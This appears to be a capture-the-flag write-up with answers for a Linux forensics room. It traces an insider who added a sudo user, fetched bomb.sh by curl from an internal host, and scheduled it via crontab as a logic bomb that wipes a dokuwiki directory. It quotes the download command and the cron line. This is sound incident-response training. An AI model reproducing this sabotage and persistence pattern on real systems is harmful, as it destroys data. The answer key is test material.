# Disgruntled

## [Task 1] Introduction

Let's take a look at another incident. An employee from an IT department has been arrested by the police, and they were running a successful phishing operation as a side gig. We need to see if anything malicious was done to any of that organization's assets. The VM attached in this room will open in Split Screen View.

## [Task 2] Linux Forensics Review

This room requires some basic knowledge of Linux and the material present in the Linux Forensics room. The cheatsheet attached to this task can help catch you up to speed.

## [Task 3] Nothing Suspicious...So Far

The attached VM is the machine that the disgruntled IT user last worked on. We need to determine if there's anything present that could be concerning. A good place to start would be to determine if any suspicious commands were run. The task clues us in on privileged commands; we can see these by looking at `/var/log/auth.log*`.  Thus, we can start by running `/var/log/auth.log* | grep -i COMMAND;`. Many of these commands pertain to the setup of `dokuwiki`, and one of them involves it being explicitly installed with `apt`:

![image](https://github.com/user-attachments/assets/b4d82fdd-7bf6-4cea-be7c-c17e45bc7a11)

**[Task 3, Question 1] The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?** - `/usr/bin/apt install dokuwiki`

The screenshot above also tells us what the working directory was at the time of the command being executed; the present working directory (PWD) is `/home/cybert`.

**[Task 3, Question 2] What was the present working directory (PWD) when the previous command was run?** - `/home/cybert`

## [Task 4] Let's See If You Did Anything Bad

We know that the user was only supposed to install a service on the machine, so our next step in the investigation might be to find anything unrelated to service installation and setup. Further down in the logs we see something pretty interesting:

![image](https://github.com/user-attachments/assets/1c1dc30b-6133-4ffd-9326-ae803c830f23)

The `adduser` command was ran, and a new user was set up on the machine. Curious!

**[Task 4, Question 1] Which user was created after the package from the previous task was installed?** - `it-admin`

Now we're told that a user was given `sudo` privileges, which requires an update to the `sudoers` file. Incidentally, updates to this particular file require the command `visudo` to be run, so we should check the logs for that. It turns out that this command _was_ run:

![image](https://github.com/user-attachments/assets/32ec97a7-1ec8-404f-9e95-69ac4b7a7f99)

**[Task 4, Question 2] A user was then later given `sudo` privileges. When was the `sudoers` file updated? (Format: `Month Day HH:MM:SS`)** - `Dec 28 06:27:34`

And right beneath the execution of `visudo`, we see something...more concerning:

![image](https://github.com/user-attachments/assets/029b83fa-75b3-4a9b-b9d8-8e70d60fd486)

**[Task 4, Question 3] A script file was opened using the `vi` text editor. What is the name of this file?** - `bomb.sh`

## [Task 5] Bomb Has Been Planted. But When and Where?

What's that file doing there?! The fact that a script file was created is incriminating enough, though we need to figure out where it came from and what it contains. Here's the kicker: the file isn't present on the system anymore. So what can we do?

Well, we know that the user `it-admin` was created. It's possible they were given `sudo` privileges as well. So maybe there's something in their command execution history that'll shed some light on this situation? We can check by running `cat /home/it-admin/.bash_history` and seeing what comes up:

![image](https://github.com/user-attachments/assets/5d70a936-df9c-4444-9059-657e0de1d98c)

Fascinating! This user indeed got the script onto the system.

**[Task 5, Question 1] What is the command used that created the file `bomb.sh`?** - `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

We're told that it was renamed and moved to a different directory. While we don't see anything suggesting it got moved from the `it-admin` user's `.bash_history`, we _do_ see that this same user was messing around with `/etc/crontab`. Given that this user has sudo privileges, they can alter the crontabs to launch scheduled tasks, including scheduling script execution. So, let's take a look at `/etc/crontab` and see if there's any clues there:

![image](https://github.com/user-attachments/assets/990e24fa-4bdc-4c72-8e63-afb9c56ddcf4)

Interesting... There's an `os-update.sh` script now. It _is_ also worth checking the Vim history (`/home/it-admin/.viminfo`) to make sure that there is a connection between the two script files. Running `cat /home/it-admin/.viminfo` yields the following:

![image](https://github.com/user-attachments/assets/b5453e2c-eac9-431c-893e-73cb025cede5)

Vim has the capability of saving a file to a different location with a different name. This is evidently what happened here, and the user set it to run at a predefined time by editing `/etc/crontab`.

**[Task 5, Question 2] The file was renamed and moved to a different directory. What is the full path of the file now?** - `/bin/os-update.sh`

If we run `date -r /bin/os-update.sh`, we can see the date that this file was last modified.

![image](https://github.com/user-attachments/assets/a09dacc7-7fcb-4acf-9dc9-0fe7413294b5)

I tried to use `ls -la` and its variants to see if I could get the hours and minutes, but for some reason it wasn't working for me in the VM. This will do the job just fine for us, though:

**[Task 5, Question 3] When was the file from the previous question last modified? (Format: Month Day HH:MM)** - Dec 28 06:29

And now, the moment of truth. What's inside this script? If we run `cat /bin/os-update.sh`, we can find out:

![image](https://github.com/user-attachments/assets/6fc47657-cac3-406d-9349-a41e8351df59)

Seems like this program is going to remove everything from the `dokuwiki` directory once certain conditions are met (namely, the user not logging in after thirty days), and then leave a note called `goodbye.txt`. Looks like we've got a logic bomb!

**[Task 5, Question 4] What is the name of the file that will get created when the file from the first question executes?** - `goodbye.txt`

## [Task 6] Following the Fuse

Now we have a file and we have a motive (the employee being, well, _disgruntled_). So now we just need to figure out how this file will be executed. Earlier we briefly discussed the contents of `/etc/crontab`, and how they were edited to make this script run at a predefined time each day. The line in question is `0 8 * * * root /bin/os-update.sh`. This means that the script will run at `8:00` on any day of any month. Note that the hour can range from `0-23` in `/etc/crontab`. This means the script will run at 8 in the morning.

**[Task 6, Question 1] At what time will the malicious file trigger? (Format HH:MM AM/PM)** - 08:00 AM
